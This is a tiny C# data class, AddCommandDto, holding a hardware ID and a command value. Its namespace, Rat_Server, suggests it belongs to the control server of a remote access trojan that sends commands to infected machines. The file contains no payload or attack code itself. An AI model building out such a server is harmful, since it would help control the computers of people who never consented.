using System.ComponentModel.DataAnnotations;

namespace Rat_Server.Model.DTOs
{
    public class AddCommandDto
    {
        [Required]
        public string Hwid { get; set; }

        [Required]
        public string CommandValue { get; set; }
    }
}
